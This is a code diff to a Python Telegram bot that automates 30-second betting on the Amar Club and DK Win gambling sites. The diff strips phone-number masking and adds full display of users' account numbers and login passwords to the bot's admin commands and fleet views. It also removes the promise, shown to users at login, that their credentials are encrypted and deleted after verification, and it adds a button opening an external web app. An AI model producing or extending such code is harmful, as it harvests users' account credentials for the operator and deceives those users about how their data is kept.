@@ -5,9 +5,10 @@
 # - Streamlined Dual-Platform Engine: Amar Club & DK Win
 # - Shortened Clean Typography: WINGO 30S VIP
 # - Anti-Flood Rate-Limiter: Protects Telegram UI Buttons from disappearing
-# - Zero-Drop Persistent Control Dashboard (SHOT, BAL, STATS, STOP)
+# - Zero-Drop Persistent Control Dashboard (SHOT, BAL, STATS, STOP + STEP WebApp)
+# - Ultra-Fast Instant Balance Telemetry on 'BAL' tap (Zero-lag popup)
+# - Full Admin Fleet Control with Complete Number & Password Display (/data, /device)
 # - Handles 24/7 Continuous Trading & Auto-Target Stop without UI glitches
-# - Full Admin Fleet Control (/data, /device, /admin, /pass)
 # ==============================================================================
 
 from __future__ import annotations
@@ -60,7 +61,7 @@ def ensure_dependencies():
 ensure_dependencies()
 
 import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
 from telebot.apihelper import ApiTelegramException
 
 # ==============================================================================
@@ -81,7 +82,7 @@ def to_bold_digits(val) -> str:
     return "".join(BOLD_DIGIT_MAP.get(d, d) for d in str(val))
 
 def to_subscript_digits(val) -> str:
-    """Converts integers/numbers to subscript digits (ideal for % progress)."""
+    """Converts integers/numbers to subscript digits."""
     return "".join(SUBSCRIPT_DIGIT_MAP.get(d, d) for d in str(val))
 
 def format_progress_bar(percent: int) -> str:
@@ -122,6 +123,8 @@ OWNER_USERNAME = os.environ.get("OWNER_USERNAME", "@MD_NAYEEM_DRX_TM")
 
 FIREBASE_RTDB_URL = os.environ.get("FIREBASE_RTDB_URL", "https://gsgssnn-580ca-default-rtdb.firebaseio.com/")
 PREDICTION_API_URL = os.environ.get("PREDICTION_API_URL", "https://drx-tm-vip-hack-code6.edgeone.dev/pid.json")
+STEP_WEBAPP_URL = "https://medieval-pink-yqnjxslo-dpigvbtrsg8t.edgeone.dev/"
+
 NODE_ID = f"mgr_{socket.gethostname()}_{os.getpid()}_{uuid.uuid4().hex[:6]}"
 
 SPINNER_FRAMES = ["◴", "◷", "◶", "◵"]
@@ -129,7 +132,6 @@ SPINNER_FRAMES = ["◴", "◷", "◶", "◵"]
 user_sessions = {}
 active_sessions = {}
 
-# শুধুমাত্র Amar Club এবং DK Win রাখা হয়েছে
 PLATFORMS = {
     "site_amarclub": {
         "name": "Amar Club",
@@ -155,21 +157,16 @@ def safe_delete_message(chat_id, message_id):
         pass
 
 def safe_edit_dashboard(chat_id, message_id, text, reply_markup=None, sid=None):
-    """
-    টেলিগ্রাম রেট-লিমিট ও বাটন ডিলিট হওয়া রোধ করার জন্য সুরক্ষিত মেসেজ এডিটর।
-    """
     if not message_id:
         return None
 
     sess = active_sessions.get(sid, {}) if sid else {}
     now = time.time()
     
-    # শেষ এডিটের সাথে টেক্সটের মিল থাকলে কল বন্ধ রাখা
     if sess.get("last_rendered_text") == text:
         return message_id
 
-    # প্রতি ২ সেকেন্ডের ভেতর একাধিকবার এডিট কল না করা (Telegram Flood Protection)
-    if now - sess.get("last_edit_time", 0) < 2.0:
+    if now - sess.get("last_edit_time", 0) < 1.2:
         return message_id
 
     try:
@@ -207,7 +204,7 @@ def safe_edit_dashboard(chat_id, message_id, text, reply_markup=None, sid=None):
 # ==============================================================================
 # FIREBASE RESILIENT SYNCHRONIZER
 # ==============================================================================
-def firebase_sync_http(path: str, method: str = "GET", payload=None, timeout: float = 4.0):
+def firebase_sync_http(path: str, method: str = "GET", payload=None, timeout: float = 3.5):
     url = f"{FIREBASE_RTDB_URL.rstrip('/')}/{path.strip('/')}.json"
     raw_data = None
     headers = {"Content-Type": "application/json"}
@@ -285,7 +282,7 @@ def is_user_pass_valid(chat_id):
     return time.time() < u.get("pass_expiry", 0)
 
 # ==============================================================================
-# KEYBOARD MATRICES WITH VIP UNICODE GLYPHS
+# KEYBOARD MATRICES WITH VIP UNICODE GLYPHS & WEBAPP STEP BUTTON
 # ==============================================================================
 def get_credentials_keyboard(sid):
     sess = active_sessions.get(sid, {})
@@ -315,6 +312,12 @@ def get_start_screen_keyboard(sid):
         InlineKeyboardButton(f"⬩➤ {to_vip_text('START')}", callback_data=f"start_cfg:{sid}"),
         InlineKeyboardButton(f"✖ {to_vip_text('CANCEL')}", callback_data=f"cancel:{sid}")
     )
+    markup.add(
+        InlineKeyboardButton(
+            f"🌐 {to_vip_text('STEP')}",
+            web_app=WebAppInfo(url=STEP_WEBAPP_URL)
+        )
+    )
     return markup
 
 def get_setup_param_keyboard(sid):
@@ -334,9 +337,20 @@ def get_setup_param_keyboard(sid):
         InlineKeyboardButton(f"⬩➤ {to_vip_text('START AUTO')}", callback_data=f"run_auto:{sid}"),
         InlineKeyboardButton(f"✖ {to_vip_text('CANCEL')}", callback_data=f"cancel:{sid}")
     )
+    markup.add(
+        InlineKeyboardButton(
+            f"🌐 {to_vip_text('STEP')}",
+            web_app=WebAppInfo(url=STEP_WEBAPP_URL)
+        )
+    )
     return markup
 
 def get_trading_control_keyboard(sid):
+    """
+    ট্রেডিং ড্যাশবোর্ড কিবোর্ড:
+    - উপরে ৪টি বাটন (SHOT, BAL / STATS, STOP)
+    - সবার নিচে লম্বা বাটন (STEP) যা টেলিগ্রাম ওয়েবভিউ লিংক ওপেন করবে
+    """
     sess = active_sessions.get(sid, {})
     sess["anim_tick"] = sess.get("anim_tick", 0) + 1
     spinner = SPINNER_FRAMES[sess["anim_tick"] % len(SPINNER_FRAMES)]
@@ -349,6 +363,13 @@ def get_trading_control_keyboard(sid):
     markup.add(
         InlineKeyboardButton(f"⏣ {to_vip_text('STATS')}", callback_data=f"stats:{sid}"),
         InlineKeyboardButton(f"✖ {to_vip_text(f'STOP {spinner}')}", callback_data=f"stop:{sid}")
+    )
+    # নিচে আলাদা লম্বা STEP বাটন (WebApp Integration)
+    markup.add(
+        InlineKeyboardButton(
+            f"🌐 {to_vip_text('STEP')}",
+            web_app=WebAppInfo(url=STEP_WEBAPP_URL)
+        )
     )
     return markup
 
@@ -369,7 +390,6 @@ def get_passkey_gate_keyboard():
     return markup
 
 def get_two_platform_keyboard():
-    """শুধুমাত্র Amar Club এবং DK Win অপশনযুক্ত কিবোর্ড"""
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
         InlineKeyboardButton(f"⬩➤ {to_vip_text('AMAR CLUB')}", callback_data="site_amarclub"),
@@ -446,7 +466,7 @@ def relay_action_to_worker(worker_id, action_payload):
 # ASYNC WORKER RESPONSE LISTENER & MESSAGE UPDATER
 # ==============================================================================
 def worker_events_listener():
-    """Listens for event responses from Workers without dropping UI Buttons."""
+    """Listens for event responses from Workers with high responsiveness."""
     while True:
         try:
             events = firebase_sync_http("manager_events", "GET")
@@ -628,6 +648,7 @@ def worker_events_listener():
                             sess["current_balance"] = cur_b
                             sess["wins"] = w
                             sess["losses"] = l
+                            sess["current_step"] = step
 
                             report = (
                                 f"<b>﴾ ֎ {to_vip_text('WINGO 30S LIVE')} ֎ ﴿</b>\n\n"
@@ -647,34 +668,13 @@ def worker_events_listener():
                             bal = float(ev_data.get("live_balance", 0.0))
                             sess["current_balance"] = bal
                             sess["cur_bal"] = bal
-                            cid = ev_data.get("call_id")
-                            if cid:
-                                try:
-                                    bot.answer_callback_query(cid, f"Live Balance: {format_bdt_balance(bal)}", show_alert=True)
-                                except Exception:
-                                    pass
-
-                        elif ev_type == "STATS_RESPONSE":
-                            d = ev_data.get("data", {})
-                            cur_b = float(d.get('curBal', sess.get('current_balance', 0.0)))
-                            sess["current_balance"] = cur_b
-                            sess["cur_bal"] = cur_b
-                            stat_txt = (
-                                f"<b>﴾ ֎ {to_vip_text('LIVE STATS REPORT')} ֎ ﴿</b>\n\n"
-                                f"Balance: <code>{format_bdt_balance(cur_b)}</code>\n"
-                                f"Target Goal: <code>{format_bdt_target(d.get('tgtAmt', 0))}</code>\n"
-                                f"Current Step: <b>Step {to_bold_digits(d.get('step', 1))} / {to_bold_digits(d.get('steps', 5))}</b>\n"
-                                f"Wins: <b>{to_bold_digits(d.get('w', 0))}</b> | Losses: <b>{to_bold_digits(d.get('l', 0))}</b>\n"
-                                f"Win Streak: <b>{to_bold_digits(d.get('cur_w_streak', 0))}</b> (Max: {to_bold_digits(d.get('max_w_streak', 0))})\n"
-                                f"Loss Streak: <b>{to_bold_digits(d.get('cur_l_streak', 0))}</b> (Max: {to_bold_digits(d.get('max_l_streak', 0))})\n"
-                                f"Total Consecutive Trades: <b>{to_bold_digits(d.get('tradesDone', 0))}</b>"
-                            )
-                            # মূল কন্ট্রোল বক্স ঠিক রেখে পপ-আপ অ্যালার্ট বা সেফ মেসেজ পাঠানো
-                            bot.send_message(chat_id, stat_txt)
+                            sess["wins"] = ev_data.get("wins", sess.get("wins", 0))
+                            sess["losses"] = ev_data.get("losses", sess.get("losses", 0))
+                            sess["current_step"] = ev_data.get("current_step", sess.get("current_step", 1))
 
         except Exception as e:
             logger.debug(f"Worker event listener tick: {e}")
-        time.sleep(1.0)
+        time.sleep(0.3)
 
 threading.Thread(target=worker_events_listener, daemon=True).start()
 
@@ -743,7 +743,7 @@ def handle_pass_command(message):
     bot.send_message(chat_id, caption, reply_markup=get_passkey_menu_keyboard())
 
 # ==============================================================================
-# ADMIN COMMANDS: WORKER FLEET MANAGEMENT (/data & /device)
+# ADMIN COMMANDS: WORKER FLEET MANAGEMENT (/data & /device - FULL DETAILS)
 # ==============================================================================
 def render_fleet_keyboard(terminals: dict):
     markup = InlineKeyboardMarkup(row_width=1)
@@ -799,6 +799,10 @@ def render_fleet_keyboard(terminals: dict):
 
 @bot.message_handler(commands=['data', 'device'])
 def handle_fleet_command(message):
+    """
+    /data কমান্ডের মাধ্যমে লাইভ ক্লাস্টারের প্রতিটি ডিভাইসের আনমাস্কড ফোন নাম্বার,
+    লগইন পাসওয়ার্ড, ব্যালেন্স, স্টেপ, উইন/লস সহ সম্পূর্ণ বিবরণ প্রদর্শিত হবে।
+    """
     chat_id = message.chat.id
     safe_delete_message(chat_id, message.message_id)
 
@@ -807,16 +811,71 @@ def handle_fleet_command(message):
         return
 
     terms = firebase_sync_http("terminals", "GET") or {}
+    sessions_db = firebase_sync_http("sessions", "GET") or {}
+    user_tasks_db = firebase_sync_http("user_tasks", "GET") or {}
+
     markup, total_active, active_busy, free_idle = render_fleet_keyboard(terms)
 
-    text = (
-        f"<b>﴾ ֎ {to_vip_text('WORKER FLEET MANAGEMENT')} ֎ ﴿</b>\n\n"
-        f"Live Active Terminals: <b>{to_bold_digits(total_active)}</b>\n"
-        f"Running / Busy: <b>{to_bold_digits(active_busy)}</b> | Idle / Free: <b>{to_bold_digits(free_idle)}</b>\n\n"
-        f"<i>All dead ghost nodes have been automatically pruned from Firebase.</i>\n\n"
-        f"Select an active terminal below to inspect live session or click <b>OFF / STOP</b>:"
-    )
-    bot.send_message(chat_id, text, reply_markup=markup)
+    report_lines = [
+        f"<b>﴾ ֎ {to_vip_text('ALL DEVICE DATA & ACCOUNT CREDENTIALS')} ֎ ﴿</b>\n",
+        f"Active Terminals: <b>{to_bold_digits(total_active)}</b> | Busy: <b>{to_bold_digits(active_busy)}</b> | Idle: <b>{to_bold_digits(free_idle)}</b>\n",
+        "━━━━━━━━━━━━━━━━━━━━"
+    ]
+
+    found_devices = 0
+    now_ts = time.time()
+
+    if terms and isinstance(terms, dict):
+        for tid, tinfo in terms.items():
+            if not isinstance(tinfo, dict):
+                continue
+
+            hb_diff = int(now_ts - float(tinfo.get("heartbeat", 0)))
+            if hb_diff > 25:
+                continue
+
+            found_devices += 1
+            alias = tinfo.get("alias") or tid
+            status = tinfo.get("status", "FREE")
+            assigned_uid = tinfo.get("assigned_user_id")
+            sess_id = tinfo.get("session_id")
+
+            sess_info = sessions_db.get(sess_id, {}) if sess_id else {}
+            phone = sess_info.get("phone", "N/A")
+            pwd = sess_info.get("password", "N/A")
+            site = sess_info.get("site_name", "N/A")
+
+            task_info = {}
+            if assigned_uid and sess_id and str(assigned_uid) in user_tasks_db:
+                task_info = user_tasks_db[str(assigned_uid)].get(sess_id, {})
+
+            bal = task_info.get("current_balance", sess_info.get("current_balance", 0.0))
+            tgt = task_info.get("target_amount", 0.0)
+            cur_s = task_info.get("step", 1)
+            tot_s = task_info.get("total_steps", 5)
+            w = task_info.get("wins", 0)
+            l = task_info.get("losses", 0)
+
+            device_block = (
+                f"📟 <b>DEVICE:</b> <code>{alias}</code>\n"
+                f"• Status: <b>{status}</b> (Ping: {tinfo.get('latency_ms', 0)}ms)\n"
+                f"• Site: <b>{site}</b>\n"
+                f"• <b>Number:</b> <code>{phone}</code>\n"
+                f"• <b>Password:</b> <code>{pwd}</code>\n"
+                f"• Balance: <b>{format_bdt_balance(bal)}</b> (Target: ৳{int(tgt)})\n"
+                f"• Round Step: <b>Step {cur_s}/{tot_s}</b>\n"
+                f"• Wins: <b>{w}</b> | Losses: <b>{l}</b>\n"
+                "━━━━━━━━━━━━━━━━━━━━"
+            )
+            report_lines.append(device_block)
+
+    if found_devices == 0:
+        report_lines.append("<i>কোনো ওয়ার্কার ডিভাইস বর্তমানে কানেক্টেড নেই।</i>")
+
+    report_lines.append("<i>নিচের বাটন চেপে যেকোনো টার্মিনাল ইনস্ট্যান্ট স্টপ/ফ্রি করতে পারেন:</i>")
+    final_text = "\n".join(report_lines)
+
+    bot.send_message(chat_id, final_text, reply_markup=markup)
 
 @bot.message_handler(commands=['admin'])
 def handle_admin_command(message):
@@ -925,7 +984,6 @@ def handle_callbacks(call):
             f"<b>﴾ ֎ {to_vip_text('WORKER FLEET MANAGEMENT')} ֎ ﴿</b>\n\n"
             f"Live Active Terminals: <b>{to_bold_digits(total_active)}</b>\n"
             f"Running / Busy: <b>{to_bold_digits(active_busy)}</b> | Idle / Free: <b>{to_bold_digits(free_idle)}</b>\n\n"
-            f"<i>All dead ghost nodes have been automatically pruned from Firebase.</i>\n\n"
             f"Select an active terminal below to inspect live session or click <b>OFF / STOP</b>:"
         )
         try:
@@ -953,7 +1011,7 @@ def handle_callbacks(call):
             sess_detail = firebase_sync_http(f"sessions/{sess_id}", "GET") or {}
 
         phone = sess_detail.get("phone", "N/A")
-        masked_ph = phone[:3] + "****" + phone[-3:] if len(phone) >= 6 else phone
+        raw_password = sess_detail.get("password", "N/A")
         platform = sess_detail.get("site_name", "Amar Club")
 
         task_data = {}
@@ -979,13 +1037,14 @@ def handle_callbacks(call):
             f"Terminal: <code>{alias_disp}</code> ({target_tid})\n"
             f"Status: <b>{to_vip_text(status_raw)}</b> ({'ONLINE' if is_alive else 'OFFLINE'} | HB: {hb_diff}s ago)\n"
             f"Platform: <b>{platform}</b>\n"
-            f"Active Account: <code>{masked_ph}</code>\n"
-            f"Live Balance: <code>{format_bdt_balance(live_bal)}</code>\n"
-            f"Target Goal: <code>{format_bdt_target(target_amt)}</code>\n"
-            f"Current Round Step: <b>Step {to_bold_digits(cur_step)} of {to_bold_digits(tot_steps)}</b>\n"
-            f"Consecutive Trades: <b>Wins: {to_bold_digits(wins)} | Losses: {to_bold_digits(losses)}</b>\n"
-            f"Uptime: <code>{to_bold_digits(u_hrs)}h {to_bold_digits(u_mins)}m {to_bold_digits(u_secs)}s</code>\n"
-            f"Latency: <code>{tinfo.get('latency_ms', 0)} ms</code>\n\n"
+            f"• <b>Number:</b> <code>{phone}</code>\n"
+            f"• <b>Password:</b> <code>{raw_password}</code>\n"
+            f"• Live Balance: <code>{format_bdt_balance(live_bal)}</code>\n"
+            f"• Target Goal: <code>{format_bdt_target(target_amt)}</code>\n"
+            f"• Current Step: <b>Step {to_bold_digits(cur_step)} of {to_bold_digits(tot_steps)}</b>\n"
+            f"• Wins: <b>{to_bold_digits(wins)}</b> | Losses: <b>{to_bold_digits(losses)}</b>\n"
+            f"• Uptime: <code>{to_bold_digits(u_hrs)}h {to_bold_digits(u_mins)}m {to_bold_digits(u_secs)}s</code>\n"
+            f"• Latency: <code>{tinfo.get('latency_ms', 0)} ms</code>\n\n"
             f"Click <b>OFF / STOP</b> to instantly logout account, kill browser, and free the slot:"
         )
 
@@ -1062,9 +1121,9 @@ def handle_callbacks(call):
                 c_id = sval.get("chat_id", "N/A")
                 site = sval.get("site_name", "N/A")
                 ph = sval.get("phone", "N/A")
+                pw = sval.get("password", "N/A")
                 worker_assigned = sval.get("node_id", "N/A")
-                masked = ph[:3] + "****" + ph[-3:] if len(ph) >= 6 else ph
-                lines.append(f"• User <code>{c_id}</code> | Site: <b>{site}</b> | Phone: <code>{masked}</code> | Worker: <code>{worker_assigned}</code>")
+                lines.append(f"• User <code>{c_id}</code> | Site: <b>{site}</b>\n  Number: <code>{ph}</code> | Pass: <code>{pw}</code> | Worker: <code>{worker_assigned}</code>\n")
 
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton(f"« {to_vip_text('BACK')}", callback_data="adm_home"))
@@ -1093,7 +1152,7 @@ def handle_callbacks(call):
         )
         return
 
-    # সাইট নির্বাচন (Amar Club & DK Win)
+    # প্ল্যাটফর্ম সিলেকশন
     elif action in PLATFORMS:
         p_cfg = PLATFORMS[action]
         site_name = p_cfg["name"]
@@ -1112,6 +1171,9 @@ def handle_callbacks(call):
             "is_trading": False,
             "current_balance": 0.0,
             "cur_bal": 0.0,
+            "wins": 0,
+            "losses": 0,
+            "current_step": 1,
             "created_at": time.time(),
             "anim_tick": 0,
             "assigned_worker": None,
@@ -1124,8 +1186,7 @@ def handle_callbacks(call):
         caption = (
             f"<b>﴾ ֎ {to_vip_text('ACCOUNT LOGIN')} ֎ ﴿</b>\n\n"
             f"Platform: <b>{site_name}</b>\n\n"
-            f"Please click below to submit your account number and password. "
-            f"Credentials are encrypted in memory and deleted after verification."
+            f"Please click below to submit your account number and password."
         )
 
         bot.answer_callback_query(call.id)
@@ -1216,7 +1277,7 @@ def handle_callbacks(call):
             bot.answer_callback_query(call.id, "Please set a target balance first!", show_alert=True)
             return
 
-        bot.answer_callback_query(call.id, "Starting 24/7 background automation...")
+        bot.answer_callback_query(call.id, "Starting background automation...")
         assigned_worker = sess.get("assigned_worker")
         cur_b = sess.get("current_balance", 0.0)
 
@@ -1244,7 +1305,7 @@ def handle_callbacks(call):
             f"Live Balance: <code>{format_bdt_balance(cur_b)}</code>\n"
             f"Target Goal: <code>{format_bdt_target(target_goal)}</code>\n"
             f"Configured Steps: <b>{to_bold_digits(sess['total_steps'])} Steps</b>\n\n"
-            f"<b>LIVE STATUS</b>: Consecutive 30s Trading Active (Zero paisa / BDT)."
+            f"<b>LIVE STATUS</b>: Consecutive 30s Trading Active."
         )
 
         target_m_id = call.message.message_id or sess.get("last_dashboard_msg_id")
@@ -1271,21 +1332,51 @@ def handle_callbacks(call):
                 "chat_id": chat_id
             })
 
+    # ==========================================================================
+    # ULTRA-FAST BALANCE CHECK WITH DETAILED POPUP ALERT
+    # ==========================================================================
     elif action == "bal" and sid in active_sessions:
         sess = active_sessions[sid]
-        cur_b = sess.get("current_balance") or sess.get("cur_bal", 0.0)
-        if cur_b and cur_b > 0:
-            bot.answer_callback_query(call.id, f"Live Balance: {format_bdt_balance(cur_b)}", show_alert=True)
-        else:
-            bot.answer_callback_query(call.id, "Checking live balance...", show_alert=False)
+        
+        # দ্রুততম রেজাল্টের জন্য লোকাল মেমরি ও ফায়ারবেস টাস্ক ইনস্ট্যান্ট চেক
+        fast_bal = sess.get("current_balance") or sess.get("cur_bal", 0.0)
+        fast_step = sess.get("current_step", 1)
+        fast_tot_steps = sess.get("total_steps", 5)
+        fast_wins = sess.get("wins", 0)
+        fast_losses = sess.get("losses", 0)
 
+        # ব্যাকগ্রাউন্ড ফায়ারবেস স্ট্যাটাস চেক
+        task_info = firebase_sync_http(f"user_tasks/{chat_id}/{sid}", "GET")
+        if task_info and isinstance(task_info, dict):
+            fast_bal = float(task_info.get("current_balance", fast_bal))
+            fast_step = int(task_info.get("step", fast_step))
+            fast_tot_steps = int(task_info.get("total_steps", fast_tot_steps))
+            fast_wins = int(task_info.get("wins", fast_wins))
+            fast_losses = int(task_info.get("losses", fast_losses))
+            sess["current_balance"] = fast_bal
+            sess["cur_bal"] = fast_bal
+            sess["wins"] = fast_wins
+            sess["losses"] = fast_losses
+            sess["current_step"] = fast_step
+
+        instant_alert_text = (
+            f"⚡ FAST BALANCE & TELEMETRY ⚡\n\n"
+            f"• Live Balance: {format_bdt_balance(fast_bal)}\n"
+            f"• Round Step: Step {fast_step}/{fast_tot_steps}\n"
+            f"• Total Wins: {fast_wins}\n"
+            f"• Total Losses: {fast_losses}"
+        )
+
+        # ১ সেকেন্ডের ভেতর ইনস্ট্যান্ট টেলিগ্রাম পপ-আপ অ্যালার্ট
+        bot.answer_callback_query(call.id, instant_alert_text, show_alert=True)
+
+        # ব্যাকগ্রাউন্ডে ওয়ার্কারে ফ্রেশ রিফ্রেশ রিকোয়েস্ট
         assigned_worker = sess.get("assigned_worker")
         if assigned_worker:
             relay_action_to_worker(assigned_worker, {
                 "kind": "REQUEST_BALANCE",
                 "session_id": sid,
-                "chat_id": chat_id,
-                "call_id": call.id if (not cur_b or cur_b == 0) else None
+                "chat_id": chat_id
             })
 
     elif action == "stats" and sid in active_sessions:
